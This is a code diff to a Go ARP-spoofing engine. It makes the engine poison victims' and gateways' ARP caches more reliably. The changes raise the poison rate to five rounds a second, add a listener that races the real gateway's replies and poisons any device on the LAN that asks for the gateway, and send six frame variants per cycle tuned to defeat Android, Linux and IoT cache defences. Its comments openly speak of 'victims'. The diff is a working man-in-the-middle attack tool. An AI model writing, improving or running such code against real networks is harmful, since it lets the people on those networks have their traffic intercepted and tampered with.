@@ -3,6 +3,7 @@
 package arpengine
 
 import (
+	"bytes"
 	"context"
 	"errors"
 	"fmt"
@@ -10,6 +11,8 @@ import (
 	"sync"
 	"time"
 
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
@@ -57,10 +60,15 @@ func copyTarget(t Target) Target {
 }
 
 // New returns an engine bound to a specific interface and operator MAC.
-// cadence=0 selects the default of 1 s.
+// cadence=0 selects the default of 200 ms — modern Android/iOS kernels
+// re-probe the gateway aggressively (often every 1-2 s, with bursts
+// triggered by traffic), so a 1 Hz poison rate frequently loses the race
+// and the victim's cache reverts to the real gateway MAC. 200 ms gives
+// us 5 poison rounds per second per target, which empirically keeps
+// modern phones' caches stuck on the operator's MAC.
 func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
 	if cadence == 0 {
-		cadence = time.Second
+		cadence = 200 * time.Millisecond
 	}
 	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, active: map[string]*runner{}}
 }
@@ -94,7 +102,74 @@ func (e *Engine) Start(t Target) error {
 	e.mu.Unlock()
 
 	go e.loop(ctx, handle, t, r.done)
+	// Also start a race-respond listener: a parallel pcap handle that
+	// watches for the victim's ARP requests asking for the gateway IP
+	// (and vice-versa). When seen, we respond IMMEDIATELY claiming the
+	// operator's MAC, racing the real gateway's reply. On Wi-Fi the
+	// operator is often closer L2-wise than the real gateway, so our
+	// frame lands first and the victim's cache gets stuck on us.
+	listenHandle, lerr := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
+	if lerr == nil {
+		// BPF filter at the kernel level so we don't waste cycles parsing
+		// non-ARP frames in user space.
+		_ = listenHandle.SetBPFFilter("arp")
+		go e.raceListener(ctx, listenHandle, t)
+	}
 	return nil
+}
+
+// raceListener watches for ARP traffic involving the target or gateway
+// and emits an immediate poisoned reply that races the real gateway's
+// response. Closes its handle on ctx cancel.
+func (e *Engine) raceListener(ctx context.Context, handle *pcap.Handle, t Target) {
+	defer handle.Close()
+
+	// Pre-build the two race replies once.
+	repGwAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
+	repVicAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
+
+	// Close the read handle when ctx is cancelled so the packet source
+	// stops blocking and the goroutine returns.
+	go func() {
+		<-ctx.Done()
+		handle.Close()
+	}()
+
+	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
+	tIP4 := t.IP.To4()
+	gwIP4 := t.GwIP.To4()
+	for pkt := range src.Packets() {
+		if ctx.Err() != nil {
+			return
+		}
+		al := pkt.Layer(layers.LayerTypeARP)
+		if al == nil {
+			continue
+		}
+		arp := al.(*layers.ARP)
+		if arp.Operation != layers.ARPRequest {
+			continue
+		}
+		// Skip our own poison frames so we don't race ourselves into
+		// a self-feedback loop.
+		if bytes.Equal(arp.SourceHwAddress, e.opMAC) {
+			continue
+		}
+		dst := net.IP(arp.DstProtAddress).To4()
+		switch {
+		case dst.Equal(gwIP4):
+			// Anyone asking "who has the gateway?" — racing reply with
+			// our MAC poisons their cache before the real gateway can
+			// answer. We don't even need it to be the specific victim;
+			// other devices on the LAN benefit too.
+			_ = handle.WritePacketData(repGwAtOp)
+		case dst.Equal(tIP4):
+			// Conversely, anyone asking "who has the victim?" — typically
+			// the gateway itself when it has return traffic for the
+			// victim. Race-reply so the gateway's cache stays poisoned.
+			_ = handle.WritePacketData(repVicAtOp)
+		}
+	}
 }
 
 func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done chan struct{}) {
@@ -102,23 +177,33 @@ func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done c
 	defer handle.Close()
 	tick := time.NewTicker(e.cadence)
 	defer tick.Stop()
+	// Pre-build the six frame variants once per loop. Re-serialising 30
+	// frames per second per target gets expensive; the buffers don't
+	// change.
+	reqVicGwAtOp, _ := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
+	repVicGwAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
+	reqGwVicAtOp, _ := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
+	repGwVicAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
+	garpGwAtOp, _ := buildGratuitousARP(e.opMAC, e.opMAC, t.GwIP)
+	garpVicAtOp, _ := buildGratuitousARP(e.opMAC, e.opMAC, t.IP)
+
 	send := func() {
-		// Poison target's cache: "gateway IP is at op MAC". REQUEST form
-		// forces sender-info learning even on cold caches; REPLY follows up
-		// for warm ones. ethL2Src=opMAC keeps the bridge FDB clean.
-		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
-			_ = handle.WritePacketData(f)
-		}
-		if f, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
-			_ = handle.WritePacketData(f)
-		}
-		// Poison gateway's cache: "target IP is at op MAC".
-		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-			_ = handle.WritePacketData(f)
-		}
-		if f, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-			_ = handle.WritePacketData(f)
-		}
+		// Six frames per cycle:
+		//   1+2: tell victim "GwIP is at opMAC"  (unicast req + rep)
+		//   3+4: tell gateway "VicIP is at opMAC" (unicast req + rep)
+		//   5+6: broadcast gratuitous announcing the same on each side
+		//
+		// Different receivers accept different forms — Linux kernels
+		// learn from REQUESTs unconditionally, modern Android phones
+		// often only accept gratuitous-with-tip==sip, and some IoT
+		// devices only update on REPLY. Sending all six per cycle
+		// maximises the probability that the receiver's cache flips.
+		_ = handle.WritePacketData(reqVicGwAtOp)
+		_ = handle.WritePacketData(repVicGwAtOp)
+		_ = handle.WritePacketData(reqGwVicAtOp)
+		_ = handle.WritePacketData(repGwVicAtOp)
+		_ = handle.WritePacketData(garpGwAtOp)
+		_ = handle.WritePacketData(garpVicAtOp)
 	}
 	send() // immediate first emission
 	for {
